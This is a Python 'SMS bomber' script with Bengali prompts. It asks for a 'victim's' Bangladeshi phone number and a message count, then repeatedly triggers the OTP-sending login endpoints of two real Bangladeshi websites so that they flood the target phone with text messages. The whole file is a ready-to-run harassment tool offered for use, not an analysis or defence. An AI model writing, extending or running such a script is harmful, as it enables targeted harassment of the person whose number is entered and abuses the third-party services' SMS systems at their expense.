import requests
import os
import time

# লোগো
os.system("clear")
logo = """
██████╗ ██████╗ ██████╗ 
██╔══██╗██╔══██╗██╔══██╗
██║  ██║██████╔╝██████╔╝
██║  ██║██╔═══╝ ██╔═══╝ 
██████╔╝██║     ██║     
╚═════╝ ╚═╝     ╚═╝     
BICP - SMS BOMBER
"""
print(logo)

# ইউজার ইনপুট
number = input("📱 ভুক্তভোগীর নাম্বার লিখুন (WITHOUT +880): ")
total_sms = int(input("✉️ এসএমএস সংখ্যা লিখুন: "))

# API তালিকা
apis = [
    {
        "url": f"https://www.bioscopelive.com/en/login/send-otp?phone=880{number}&operator=bd-otp",
        "method": "GET",
        "headers": {
            "User-Agent": "Mozilla/5.0"
        },
    },
    {
        "url": f"https://bikroy.com/data/phone_number_login/verifications/phone_login?phone=0{number}",
        "method": "GET",
        "headers": {
            "Referer": "https://bikroy.com/bn/users/login",
            "User-Agent": "Mozilla/5.0"
        },
    },
]

# এসএমএস পাঠানো শুরু
count = 0
print("\n📡 এসএমএস পাঠানো শুরু হচ্ছে...")
for i in range(total_sms):
    for api in apis:
        try:
            if api["method"] == "GET":
                response = requests.get(api["url"], headers=api["headers"])
            elif api["method"] == "POST":
                response = requests.post(api["url"], headers=api["headers"], data=api.get("data"))
            
            if response.status_code == 200:
                count += 1
                print(f"✅ {count}/{total_sms} এসএমএস সফলভাবে পাঠানো হয়েছে!")
            else:
                print(f"❌ এসএমএস পাঠানো ব্যর্থ: {response.status_code}")
        except Exception as e:
            print(f"⚠️ ত্রুটি: {e}")
        time.sleep(1)  # প্রতিটি এসএমএসের মাঝে সময় বিরতি

print("\n🎉 কাজ শেষ! সব এসএমএস পাঠানো হয়েছে।")
